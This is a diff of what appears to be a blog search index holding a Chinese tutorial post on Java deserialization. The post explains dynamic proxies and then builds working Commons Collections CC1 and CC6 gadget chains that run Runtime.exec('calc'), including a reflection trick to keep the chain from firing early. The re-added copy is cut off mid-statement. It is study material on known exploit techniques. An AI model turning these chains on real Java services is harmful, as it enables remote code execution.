-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建目标对象</span></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建AnnotationInvocationhandler实现类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//由于最终是调用memberValues.get,所以使用构造方法AnnotationInvocationHandler(type, memberValues) 第二个参数是lazymap</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">annotationInvocationhandler</span> <span class="operator">=</span> (InvocationHandler)constructor.newInstance(Override.class,lazymap);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建动态代理对象</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">mapproxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">        map.getClass().getClassLoader(),</span><br><span class="line">        map.getClass().getInterfaces(),</span><br><span class="line">        annotationInvocationhandler);</span><br></pre></td></tr></table></figure>
-<p>创建完了以后,我们得调用动态代理对象的一个方法,在invoke中有两个if方法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">    paramTypes[<span class="number">0</span>] == Object.class)<span class="comment">//判断方法名字是否为equals</span></span><br><span class="line">    <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)<span class="comment">//传参是否不为空</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br></pre></td></tr></table></figure>
-<p>必须使这两个if语句为假,才会执行到get语句那里,所以选择的方法要求<code>不是equal方法,传参还需为空,同时必须在反序列化中被调用</code>,巧合的是AnnotationInvocationHandler中的readObject刚好就存在这样的方法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br></pre></td></tr></table></figure>
-<p>这里就调用了<code>memberValues.entrySet()</code>,所以我们要使memberValues=mapproxy（创建的代理对象）</p>
-<p>如下：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Override.class,mapproxy);</span><br></pre></td></tr></table></figure>
-<p>故最后的命令执行代码为：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建目标对象</span></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建AnnotationInvocationhandler实现类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">annotationInvocationhandler</span> <span class="operator">=</span> (InvocationHandler)constructor.newInstance(Override.class,lazymap);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建动态代理对象</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">mapproxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">        map.getClass().getClassLoader(),</span><br><span class="line">        map.getClass().getInterfaces(),</span><br><span class="line">        annotationInvocationhandler);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Override.class,mapproxy);</span><br><span class="line"></span><br><span class="line">Serialize(obj);</span><br><span class="line"><span class="type">Object</span> <span class="variable">objecj</span> <span class="operator">=</span> Unserialize(<span class="string">&quot;test.ser&quot;</span>);</span><br></pre></td></tr></table></figure>
-<p><img src="image-20230323154644608.png" alt="image-20230323154644608"></p>
-<h1 id="CC6链">CC6链</h1>
-<p>之前的实验一直都是在jdk为8u65的环境下进行的,这是因为Oracle在<code>jdk8u71</code>版本就修改了AnnotationInvocationHandler的readObject方法,不再直接调用memberValues,导致之前的整条链全都行不通了</p>
-<p>所以我们要找一条所有jdk版本都可以使用的利用链</p>
-<p>之前我们在学URLDNS的时候利用到了HashMap里的readObject方法,这个方法会最终调用key的hashcode方法,而正好有一个TiedMapEntry类中带有hashcode方法,同时这个方法又调用了自己的getValue方法,进而调用了get方法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">this</span>.map = map;</span><br><span class="line">    <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">           (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>于是命令执行代码构造如下：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;13&quot;</span>);</span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">Test.Serialize(hashMap);</span><br></pre></td></tr></table></figure>
-<p>但执行的时候会发现直接就调出了计算器,说明整条链还没序列化就跑完了,原理和URLDNS类似,在HashMap的put方法中,已经调用了hashcode方法,所以我们得通过反射来解决这个问题</p>
-<p><img src="image-20230323170709111.png" alt="image-20230323170709111"></p>
-<p>在put前,我们要让整条链先断开,put完了以后再连上</p>
-<p>这里我们选择断开TiedMapEntry到LazyMap的这条链,将tiedMapEntry对象的实例化代码修改为</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;13&quot;</span>);<span class="comment">//传入map而不是lazymap</span></span><br></pre></td></tr></table></figure>
-<p>put完了以后在通过反射修改tiedMapEntry对象的map属性值</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> tiedMapEntry.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">mapfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">mapfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">mapfield.set(tiedMapEntry,lazymap);</span><br></pre></td></tr></table></figure>
-<p>所以整个命令执行代码修改为：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//断开利用链</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;13&quot;</span>);</span><br><span class="line"><span class="comment">//TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,&quot;13&quot;);</span></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射恢复利用链</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> tiedMapEntry.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">mapfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">mapfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">mapfield.set(tiedMapEntry,lazymap);</span><br><span class="line">Test.Serialize(hashMap);</span><br></pre></td></tr></table></figure>
-<p>反序列化命令执行成功！！！</p>
-<p><img src="image-20230323173008338.png" alt="image-20230323173008338"></p>
-]]></content>
-      <categories>
-        <category>JAVA</category>
-      </categories>
-      <tags>
-        <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>java反序列化之类的动态加载与cc3</title>
     <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E4%B8%8Ecc3/</url>
     <content><![CDATA[<h1 id="类的动态加载">类的动态加载</h1>
@@ -1008,6 +948,66 @@ InitialContext#lookup</p>
       </tags>
   </entry>
   <entry>
+    <title>java反序列化之动态代理,cc1和cc6</title>
+    <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86,cc1%E5%92%8Ccc6/</url>
+    <content><![CDATA[<h1 id="动态代理">动态代理</h1>
+<p><code>Java动态代理</code>是一种在运行时生成代理对象的机制,它可以在运行时动态地创建一个实现特定接口的代理类,并将所有调用委托给处理器。</p>
+<p>在Java中,动态代理由java.lang.reflect包中的<code>Proxy类</code>和<code>InvocationHandler接口</code>提供支持。要创建动态代理,首先必须定义一个实现InvocationHandler接口的类,该接口只有一个方法invoke(Object proxy, Method method, Object[]  args),它会在代理对象上调用任何方法时被调用。然后,使用Proxy.newProxyInstance()方法来创建代理对象,该方法需要传递一个<code>ClassLoader对象</code>、<code>一组接口</code>以及一个<code>InvocationHandler对象</code>作为参数。</p>
+<p>当代理对象上调用方法时,代理对象将委托给InvocationHandler对象的<code>invoke()</code>方法来处理该方法的调用。在invoke()方法内部,可以根据需要执行其他逻辑,例如记录日志或者进行权限检查,然后再将请求转发给实际的目标对象。这样就可以实现动态代理的功能。</p>
+<p>示例代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HelloImpl</span> <span class="keyword">implements</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义InvocationHandler实现类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyInvocationHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Before Method Invoke&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;After Method Invoke&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicProxyDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建目标对象</span></span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建InvocationHandler实现类</span></span><br><span class="line">        <span class="type">MyInvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyInvocationHandler</span>(hello);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建动态代理对象</span></span><br><span class="line">        <span class="type">Hello</span> <span class="variable">proxy</span> <span class="operator">=</span> (Hello) Proxy.newProxyInstance(</span><br><span class="line">                hello.getClass().getClassLoader(),</span><br><span class="line">                hello.getClass().getInterfaces(),</span><br><span class="line">                handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用动态代理对象的方法</span></span><br><span class="line">        proxy.sayHello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Before Method Invoke</span><br><span class="line">Hello World</span><br><span class="line">After Method Invoke</span><br></pre></td></tr></table></figure>
+<p>由于<code>不论我们调用任何动态代理对象方法都会执行invoke方法</code>,所以为我们的反序列化利用提供了便利</p>
+<h1 id="CC1链">CC1链</h1>
+<p>我们之前最终的利用链是</p>
+<p>AnnotationInvocationHandler.readObject()-&gt;AbstractInputCheckedMapDecorator.MapEntry.setValue()-&gt;TransformedMap.checkSetValue()-&gt;ChainedTransformer.transform()</p>
+<p>我们一开始在查找有谁调用了InvokerTransformer.transform()方法的时候找的是TransformedMap的checkSetValue方法,但实际上还有很多其他的调用方法,例如在<code>LazyMap</code>中的<code>get</code>方法也调用了InvokerTransformer.transform()</p>
+<p><img src="image-20230323132610636.png" alt="image-20230323132610636"></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那我们就可以针对这一条链进行尝试</p>
+<p>调用了get的方法很多,这里我们发现在AnnotationInvocationHandler的invoke方法里也调用了get方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> toStringImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);<span class="comment">//调用了get方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">        <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">        result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里就涉及到了动态加载</p>
+<p>于是我们需要创建一个动态代理对象,代码如下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建目标对象</span></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建AnnotationInvocationhandler实现类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//由于最终是调用memberValues.get,所以使用构造方法AnnotationInvocationHandler(type, memberValues) 第二个参数是lazymap</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">annotationInvocationhandler</span> <span class="operator">=</span> (InvocationHandler)constructor.newInstance(Override.class,lazymap);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建动态代理对象</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">mapproxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">        map.getClass().getClassLoader(),</span><br><span class="line">        map.getClass().getInterfaces(),</span><br><span class="line">        annotationInvocationhandler);</span><br></pre></td></tr></table></figure>
+<p>创建完了以后,我们得调用动态代理对象的一个方法,在invoke中有两个if方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">    paramTypes[<span class="number">0</span>] == Object.class)<span class="comment">//判断方法名字是否为equals</span></span><br><span class="line">    <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)<span class="comment">//传参是否不为空</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>必须使这两个if语句为假,才会执行到get语句那里,所以选择的方法要求<code>不是equal方法,传参还需为空,同时必须在反序列化中被调用</code>,巧合的是AnnotationInvocationHandler中的readObject刚好就存在这样的方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br></pre></td></tr></table></figure>
+<p>这里就调用了<code>memberValues.entrySet()</code>,所以我们要使memberValues=mapproxy（创建的代理对象）</p>
+<p>如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Override.class,mapproxy);</span><br></pre></td></tr></table></figure>
+<p>故最后的命令执行代码为：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建目标对象</span></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建AnnotationInvocationhandler实现类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">annotationInvocationhandler</span> <span class="operator">=</span> 